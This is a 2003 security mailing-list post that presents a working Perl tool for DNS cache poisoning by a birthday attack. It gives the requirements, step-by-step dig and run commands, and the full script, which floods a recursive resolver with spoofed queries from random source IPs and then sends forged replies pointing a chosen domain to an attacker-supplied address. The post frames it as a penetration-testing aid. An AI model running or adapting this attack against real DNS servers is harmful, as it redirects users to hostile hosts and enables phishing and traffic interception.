@@ -1,0 +1,255 @@
+
+Date: Thu, 24 Apr 2003 18:36:47 +0200
+From: "Ramon Izaguirre" <ramontxo@...pop.com>
+To: <bugtraq@...urityfocus.com>, <pen-test@...urityfocus.com>
+Subject: An Implementation of a Birthday Attack in a DNS Spoofing
+
+
+
+ An Implementation of a Birthday Attack in a DNS Spoofing.
+
+ By Ramon Izaguirre.
+
+
+ 0.- Introduction,
+
+ In november 2002 Vagner Sacramento discovered that a dns server would reply
+with n responses to n queries made
+from different ip addresses for the same domain
+(http://www.rnp.br/cais/alertas/2002/cais-ALR-19112002a.html)
+that enables a more effective dns spoofing attack to be performed.
+
+ In jannuary 2002 Joe Stewart wrote an article about the different and new
+DNS issues
+ (http://www.securityfocus.com/guest/17905) and included a perl script to
+check the probability and sucessfulness
+ of an n-n attack (Birthday Attack) performed against a dns server but the
+script did not carry out the attack itself.
+
+ This tool is a perl implementation of such an attack that does it. With the
+upcoming of IPv6 DNS will become much
+ important that today is and its vulnerabilities even much more critical.
+
+ 1.- Requirements,
+
+ * The DNS Server should allow recursive queries to be performed from you.
+ * Your ISP should allow you to send source ip spoofed packets.
+ * Your source ip should not be nated.
+
+ * Before running the tool itself you need to know the source port that the
+dns server to be spoofed will use.
+ You can do it by modifiying the script of Joe Stewart and replace the line
+that says:
+
+ printf "Received recursive query with transaction ID: $tid\r";
+
+ For a line that says:
+
+ printf "Received recursive query with transaction ID: $tid port
+%s\r",$server->peerport();
+
+ Save it and call it poison.pl for example.
+
+ 2.- Howto.
+
+ Example: we have www.example.com and we want to deceive 172.16.54.3 into
+thinking that www.example.com
+resolves to 192.168.0.1.
+
+ a) Get the nameservers of example.com
+
+ dig example.com
+
+ example.com 43200 IN NS ns1.example.com
+ ns1.example.com 43200 IN A 10.0.0.1
+
+ dig @10.0.0.1 www.example.com
+
+ www.example.com 172800 IN A ...; this number 172800 is the DNS TTL. see
+later.
+
+ b) Run poison.pl against a domain that points to you. it will give you the
+source port.
+
+    ./poison.pl 172.16.54.3 www.mydomain.com
+
+    source port: 65423
+
+ c) Launch hds0.pl 10.0.0.1
+
+    ./hds0.pl 10.0.0.1 172.16.54.3 32546 www.example.com 192.168.0.1
+
+ d) See if you were sucessful. Be careful here! If you have been unsucessful
+in your attack you will need to
+    wait 172800 seconds (48 hours) to launch the attack again.
+
+    dig @172.16.54.3 www.example.com
+
+    www.example.com 86400 IN A 192.168.0.1
+
+ 3.- Be careful with...
+
+ * The domains have usually more than one DNS Server and you do not know
+which one of both will be asked the query.
+ * If you are running out of time in your security test, be careful with
+step d) as if you do it and you have
+ not been sucessful in the previous step, you will wait from 24 to 48 to be
+able to perform attack again so may be
+ it is better to perform it in the first steps of the security testing
+process.
+
+ 4.- The tool.
+
+
+
+#!/usr/bin/perl
+#
+# By Ramon Izaguirre
+#
+# happydnspoofing is a tool to perform a more effective DNS spoofing attack
+by taking advantage of the vulnerability exposed by Vagner Sacramento
+(http://www.rnp.br/cais/alertas/2002/cais-ALR-19112002a.html) and pointed
+out by Joe Stewart (http://www.securityfocus.com/guest/17905).
+#
+# the sintax looks quite rare but think how to build the spoofed packet and
+it will make sense.
+#
+# for example:
+#
+# we have www.example.com and we want to deceive 172.16.54.3 ( a dns server
+that allows recursive queries to be performed) into thinking that
+www.example.com resolves to 192.168.0.1
+#
+# dig (the dns server of) example.com -> source(ip) = 10.0.0.1
+#      -> destination(ip) = 172.16.54.3
+# poison.pl 172.16.54.3 www.mydomain.com-> source_port = 32546
+#      -> domain = www.example.com
+#      -> spoofed(ip) = 192.168.0.1
+# for a probability of 100% sucess -> number_of_packets = 1140
+#
+#
+# <---------------------------------- ip
+packet ---------------------------------------->
+#                                     <-------------------udp
+segment------------------->
+#                                                     <-----------dns
+data-------------->
+#
+____________________________________________________________________________
+__________
+# |...|source(ip)|destination(ip)|...|source_port|...|      domain     |
+spoofed(ip) |...|
+#  -------------------------------------------------------------------------
+-------------
+#
+____________________________________________________________________________
+__________
+# |...| 10.0.0.1 |  172.16.54.3  |...|   32546   |...| www.example.com |
+192.168.0.1 |...|
+#  -------------------------------------------------------------------------
+------------- 
+#
+# ./hds0.pl 10.0.0.1 172.16.54.3 32546 www.example.com 192.168.0.1
+
+use Net::DNS;
+use Net::RawIP qw(:pcap);
+#use strict; # too strict
+
+$| = 1;
+my $usage = "\nusage: $0 source(ip) destination(ip) source_port domain
+spoofed(ip) [number_of_packets]\n";
+
+die "$usage" unless $ARGV[0] && $ARGV[1] && $ARGV[2] && $ARGV[3] &&
+$ARGV[4];
+
+# those are parameters to build the queries at layers 3,4,7.
+my @anyip;
+my @anyport;
+my @anyid;
+
+# those are parameters to build the fake responses at layers 3,4,7.
+my $saddr=$ARGV[0];
+my $daddr=$ARGV[1];
+my $sport=$ARGV[2];
+my $dport='53';
+my $fakeip = $ARGV[4];
+my @transId;
+
+# parameters for both, queries and responses.
+my $domain = $ARGV[3];
+
+# more parameters.
+$m = 1140;
+if ($ARGV[5]!=0) {$m = $ARGV[5];}
+
+# auxiliary parameters.
+my $s;
+my $t;
+my $x;
+my $port_range = 64512; #65536-1024
+my $id_range = 65536;
+
+# build query packets skeleton...
+my $packet_q = Net::DNS::Packet->new($domain);
+my $restpacket_q = substr($packet_q->data,2);
+my $udp_q = new Net::RawIP({ip=> {daddr=>$daddr}, udp=>{dest=>$dport}});
+
+# build response packets skeleton and more...
+my $packet_r = Net::DNS::Packet->new($domain);
+$packet_r->push("pre",rr_add($domain . " A " . $fakeip));
+$packet_r->header->qr(1);
+my $restpacket_r = substr($packet_r->data,2);
+my $udp_r = new Net::RawIP({ip=> {saddr=>$saddr, daddr=>$daddr},
+udp=>{source=>$dport, dest=>$sport}});
+
+for (0..($m - 1))
+ { $anyip[$_] =
+sprintf("%d.%d.%d.%d",int(rand(224)),int(rand(256)),int(rand(256)),int(rand(
+256)));
+   $anyport[$_] = sprintf("%d", int(rand($port_range)+1024));
+   $anyid[$_] =   pack ("H*", sprintf("%.4x", int(rand($id_range))));
+ }
+
+#print "\n---> Source IP\t\tDestination IP\tSPort\tDPort\ttransaction ID";
+
+# Generate unique transaction Ids.
+
+print "\nGenerating unique transaction id numbers...";
+
+for ($x=0; $x<$m; $x++)
+ {
+   $t=1;
+   while($t==1)
+   {
+    $t=0;
+    $s = pack ("H*", sprintf("%.4x", int(rand($id_range))));
+    for (@transId) { if ( $s eq $_ ) {$t = 1; break;}}
+   }
+   $transId[$x] = $s;
+#   print "\n---> $anyip[$x]\t$daddr\t$anyport[$x]\t$dport";
+ }
+
+
+
+#---------------------------------------------------------------------------
+-------------------
+# start sending queries...
+
+print "\nSending the packets...";
+
+for (0..($m - 1)) {
+     $udp_q->set({ip=> {saddr=>$anyip[$_]}, udp=>{source=>$anyport[$_],
+data=>$anyid[$_] . $restpacket_q}});
+     $udp_q->send();
+    }
+
+# start sending responses...
+for (@transId) {
+  $udp_r->set({udp=>{data=>$_ . $restpacket_r}});
+  $udp_r->send();
+  }
+
+print "\nDone.\n";
+
+
+
